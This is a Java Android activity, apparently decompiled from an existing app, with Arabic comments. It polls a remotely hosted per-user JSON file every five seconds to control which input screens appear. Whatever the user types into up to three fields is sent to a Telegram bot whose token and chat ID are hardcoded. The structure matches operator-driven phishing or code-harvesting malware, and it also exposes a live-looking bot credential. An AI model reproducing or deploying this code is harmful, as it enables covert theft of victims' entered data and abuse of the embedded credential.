package com.ban.ab;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import org.json.JSONObject;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class SecondActivity extends AppCompatActivity {

    // Instance Fields (كما ظهرت في ملف Smali)
    private final String BOT_TOKEN = "8728882712:AAHBUsyFmocj1AwCJSVE-kPMIG7zy9WcZo4";
    private final String CHAT_ID = "1749638488";
    private final String GITHUB_RAW_URL = "https://cdn.jsdelivr.net/gh/abdullah14120/ban@main/commands/";
    
    private final OkHttpClient client = new OkHttpClient();
    private final Handler handler = new Handler();
    
    private Button btnCancelOrder, btnConfirm1, btnConfirm2, btnConfirm3, btnFinalOrder;
    private EditText field1, field2, field3;
    private LinearLayout groupField1, groupField2, groupField3;
    private LinearLayout layoutFields, layoutRejected, layoutWaiting;
    private TextView txtRejectReason;
    private String userName;
    private Runnable refreshRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_second);

        initViews();

        // جلب اسم المستخدم من التفضيلات المشتركة
        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        userName = pref.getString("user_name", "unknown");

        setupButtons();
        startAutoRefresh();
    }

    private void initViews() {
        layoutWaiting = findViewById(R.id.layoutWaiting);
        layoutRejected = findViewById(R.id.layoutRejected);
        layoutFields = findViewById(R.id.layoutFields);
        groupField1 = findViewById(R.id.groupField1);
        groupField2 = findViewById(R.id.groupField2);
        groupField3 = findViewById(R.id.groupField3);
        txtRejectReason = findViewById(R.id.txtRejectReason);
        field1 = findViewById(R.id.field1);
        field2 = findViewById(R.id.field2);
        field3 = findViewById(R.id.field3);
        btnConfirm1 = findViewById(R.id.btnConfirm1);
        btnConfirm2 = findViewById(R.id.btnConfirm2);
        btnConfirm3 = findViewById(R.id.btnConfirm3);
        btnFinalOrder = findViewById(R.id.btnFinalOrder);
        btnCancelOrder = findViewById(R.id.btnCancelOrder);
    }

    private void setupButtons() {
        // Lambda $setupButtons$0, 1, 2
        btnConfirm1.setOnClickListener(v -> sendToTg("الحقل الأول", field1.getText().toString()));
        btnConfirm2.setOnClickListener(v -> sendToTg("الحقل الثاني", field2.getText().toString()));
        btnConfirm3.setOnClickListener(v -> sendToTg("الحقل الثالث", field3.getText().toString()));

        // Lambda $setupButtons$3 (إكمال الطلب)
        btnFinalOrder.setOnClickListener(v -> 
            Toast.makeText(this, "شكراً لك، تم إرسال الطلب النهائي بنجاح.", Toast.LENGTH_LONG).show()
        );

        // Lambda $setupButtons$4 (إلغاء الطلب)
        btnCancelOrder.setOnClickListener(v -> cancelOrder());
    }

    private void startAutoRefresh() {
        refreshRunnable = new Runnable() {
            @Override
            public void run() {
                checkCommand();
                // التحديث كل 5 ثوانٍ تقريباً كما هو معتاد في الـ RefreshLoops
                handler.postDelayed(this, 5000); 
            }
        };
        handler.post(refreshRunnable);
    }

    private void checkCommand() {
        String url = GITHUB_RAW_URL + userName + ".json";
        Request request = new Request.Builder().url(url).build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) { }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful() && response.body() != null) {
                    try {
                        JSONObject json = new JSONObject(response.body().string());
                        runOnUiThread(() -> updateUI(json));
                    } catch (Exception ignored) { }
                }
            }
        });
    }

    private void updateUI(JSONObject json) {
        try {
            String status = json.getString("status");

            // التحكم في ظهور الواجهات الرئيسية
            layoutWaiting.setVisibility(status.equals("waiting") ? View.VISIBLE : View.GONE);
            layoutRejected.setVisibility(status.equals("rejected") ? View.VISIBLE : View.GONE);
            layoutFields.setVisibility(status.equals("fields_form") ? View.VISIBLE : View.GONE);

            // في حال الرفض
            if (status.equals("rejected")) {
                txtRejectReason.setText(json.optString("reject_reason", "الطلب مرفوض"));
            }

            // في حال واجهة الحقول
            if (status.equals("fields_form")) {
                int count = json.optInt("visible_fields", 1);
                groupField1.setVisibility(count >= 1 ? View.VISIBLE : View.GONE);
                groupField2.setVisibility(count >= 2 ? View.VISIBLE : View.GONE);
                groupField3.setVisibility(count >= 3 ? View.VISIBLE : View.GONE);
                
                boolean showFinal = json.optBoolean("show_final_button", false);
                btnFinalOrder.setVisibility(showFinal ? View.VISIBLE : View.GONE);
            }
        } catch (Exception ignored) { }
    }

    private void sendToTg(String label, String value) {
        if (value.length() < 6) {
            Toast.makeText(this, "يرجى إدخال البيانات بشكل صحيح", Toast.LENGTH_SHORT).show();
            return;
        }
        String msg = "📩 تحديث من " + userName + ":\n" + label + " ⬅️ " + value;
        sendNotificationOnly(msg);
        Toast.makeText(this, "تم إرسال " + label, Toast.LENGTH_SHORT).show();
    }

    private void cancelOrder() {
        String cancelMsg = "⚠️ إشعار: قام المستخدم بإلغاء طلبه.\n👤 الاسم: " + userName;
        sendNotificationOnly(cancelMsg);

        // مسح البيانات محلياً
        SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        pref.edit().clear().apply();

        // Lambda $cancelOrder$5 (العودة للرئيسية)
        runOnUiThread(() -> {
            Toast.makeText(this, "تم إلغاء الطلب ومسح البيانات", Toast.LENGTH_SHORT).show();
            startActivity(new Intent(this, MainActivity.class));
            finish();
        });
    }

    private void sendNotificationOnly(String text) {
        RequestBody body = new FormBody.Builder()
                .add("chat_id", "1749638488")
                .add("text", text)
                .build();

        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) { }
            @Override public void onResponse(Call call, Response response) throws IOException { }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // إيقاف التحديث التلقائي عند إغلاق النشاط
        handler.removeCallbacks(refreshRunnable);
    }
}
